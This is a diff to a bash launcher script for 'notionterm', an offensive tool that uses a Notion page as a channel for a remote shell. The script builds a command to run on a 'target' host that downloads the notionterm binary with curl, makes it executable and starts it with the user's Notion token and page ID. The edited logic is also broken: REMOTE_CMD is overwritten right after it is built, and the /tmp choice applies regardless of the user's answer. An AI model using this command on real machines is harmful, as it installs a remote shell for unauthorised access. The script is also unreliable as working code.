@@ -57,21 +57,27 @@ TOKEN="$(gum input --password --placeholder="Enter notion token")"
 
 # tmux split-window -h "python -m http.server ${LPORT}"
 
-# # Notionterm on target
-REMOTE_CMD="curl -lO -L -s https://github.com/ariary/notionterm/releases/latest/download/notionterm && chmod +x notionterm"
+## Notionterm on target
+REMOTE_CMD=""
+BINARY="./notionterm"
+
+gum confirm "Save binary in /tmp directory ?" && REMOTE_CMD="mkdir -p /tmp/notionterm &&" ;BINARY="/tmp/notionterm/notionterm"
+REMOTE_CMD="${REMOTE_CMD} curl -o ${BINARY} -L -s https://github.com/ariary/notionterm/releases/latest/download/notionterm && chmod +x ${BINARY}"
+
+REMOTE_CMD=" curl -o ${BINARY} -L -s https://github.com/ariary/notionterm/releases/latest/download/notionterm && chmod +x ${BINARY}"
 MODE="$(gum choose "target → notion" "from any page" "normal")"
 TARGET_URL=""
 
 if [ "$MODE" = "target → notion" ]; then
     PAGEID="$(gum input --placeholder="Enter notion page ID (CTRL+L)")"
-    REMOTE_CMD="${REMOTE_CMD} && ./notionterm light -u ${PAGEID} -t ${TOKEN}"
+    REMOTE_CMD="${REMOTE_CMD} && ${BINARY} light -u ${PAGEID} -t ${TOKEN}"
 elif [ "$MODE" = "from any page" ]; then
-    REMOTE_CMD="${REMOTE_CMD} && ./notionterm --server -t ${TOKEN}"
+    REMOTE_CMD="${REMOTE_CMD} && ${BINARY} --server -t ${TOKEN}"
     TARGET_URL="$(gum input --placeholder="Enter target IP/URL")"
     gum confirm "Include Port (9292) in target IP/URL?" && TARGET_URL="${TARGET_URL}:9292"
 else
     PAGEID="$(gum input --placeholder="Enter notion page ID (CTRL+L)")"
-    REMOTE_CMD="${REMOTE_CMD} && ./notionterm -u ${PAGEID} -t ${TOKEN}"
+    REMOTE_CMD="${REMOTE_CMD} && ${BINARY} -u ${PAGEID} -t ${TOKEN}"
     TARGET_URL="$(gum input --placeholder="Enter target IP/URL")"
     gum confirm "Include Port (9292) in target IP/URL?" && TARGET_URL="${TARGET_URL}:9292"
 fi
